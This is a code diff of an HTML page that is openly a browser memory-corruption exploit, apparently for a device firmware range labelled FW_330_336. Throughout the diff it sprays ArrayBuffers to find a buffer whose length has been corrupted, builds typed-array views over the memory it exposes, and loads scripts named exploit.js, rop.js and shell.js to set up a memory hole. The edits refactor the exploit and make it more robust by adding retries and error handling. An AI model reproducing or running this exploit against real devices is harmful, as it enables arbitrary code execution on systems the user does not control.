@@ -5,11 +5,21 @@ html, a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13, a14, a15, a16, a17
 }
 </style>
 
-<script type="text/javascript">
-arrays = Array();
-gc = Array();
+<script src="include/FW_330_336/exploit.js"></script>
+<script src="include/FW_330_336/jquery.min.js"></script>
+<script src="include/FW_330_336/lib.js"></script>
+<script src="include/FW_330_336/rop.js"></script>
+<script src="include/FW_330_336/shell.js"></script>
+<script src="include/FW_330_336/utils.js"></script>
 
-function load()
+<script type="text/javascript">
+var tries = 0;
+arrays = new Array();
+gc = new Array();
+newarrays = new Array();
+latest = new Array();
+
+function payload()
 {
 	for (var i = 0; i < 0x1000; ++i) {
         gc.push(new ArrayBuffer(0x30));
@@ -23,7 +33,8 @@ function load()
 
     for (var i = 0; i < 0x100; ++i)
         arrays.push(new ArrayBuffer(0x20040));
-    setTimeout(al, 100);
+		
+    setTimeout(check, 100);
 }
 
 function crashme()
@@ -42,17 +53,7 @@ function crash()
     throw "BadLuck";
 }
 
-function dbg()
-{
-    alert(corrupted.byteLength.toString(16));
-    var u32 = new Uint32Array(corrupted);
-    var s = "";
-    for (var i = 0; i < 0xc0 / 4; ++i)
-        s += u32[0x20000 / 4 + i].toString(16) + ",";
-    alert(s);
-}
-
-function al()
+function check()
 {
     corrupted = undefined;
     for (var i = 0; i < arrays.length; ++i) {
@@ -61,27 +62,29 @@ function al()
             break;
         }
     }
+	
     if (!corrupted)
         crash();
-    arrays = Array();
-    gc = Array();
+    
+	arrays = new Array();
+    gc = new Array();
 
     setTimeout(spray, 10);
 }
 
-newarrays = Array();
-latest = Array();
-
-var tries = 0;
-
 function spray()
 {
     ++tries;
-    document.write("Attempt #" + tries + "<br>");
-    if (tries > 10)
+	
+	document.write("Attempt #" + tries + "<br>");
+	
+    if (tries > 20)
+	{
+		document.write("Too many attempts!");
         crash();
-
-    latest = Array();
+	}
+	
+    latest = new Array();
     for (var i = 0; i < 0x20000; ++i) {
         var t = new ArrayBuffer(0x7);
         newarrays.push(t);
@@ -100,6 +103,7 @@ function spray()
             u32[j] = 0xFFFFFFE0;
         }
     }
+	
     if (found) {
         for (var i = 0; i < latest.length; ++i) {
             if (latest[i].byteLength == 0xFFFFFFE0) {
@@ -114,18 +118,14 @@ function spray()
         aspace = new Uint8Array(big);
         aspace16 = new Uint16Array(big);
         aspace32 = new Uint32Array(big);
+		
         setTimeout(function() {
-            document.write(
-				'<sc' + 'ript src="include/FW_330_336/exploit.js"></sc' + 'ript>' +
-				'<sc' + 'ript src="include/FW_330_336/jquery.min.js"></sc' + 'ript>' +
-				'<sc' + 'ript src="include/FW_330_336/lib.js"></sc' + 'ript>' +
-				'<sc' + 'ript src="include/FW_330_336/rop.js"></sc' + 'ript>' +
-				'<sc' + 'ript src="include/FW_330_336/shell.js"></sc' + 'ript>' +
-                '<sc' + 'ript src="include/FW_330_336/utils.js"></sc' + 'ript>'
-            );
-			
-			initMemoryHole();
-			shell(aspace);
+			var res = initMemoryHole();
+            
+			if (res == -1) {
+				logdbg("Initialization failed!");
+				crash();
+			}
         }, 100);
     } else {
         setTimeout(spray, 10);
@@ -133,5 +133,5 @@ function spray()
 }
 </script>
 
-<iframe onload=load()>
+<iframe onload=payload()>
 </html>
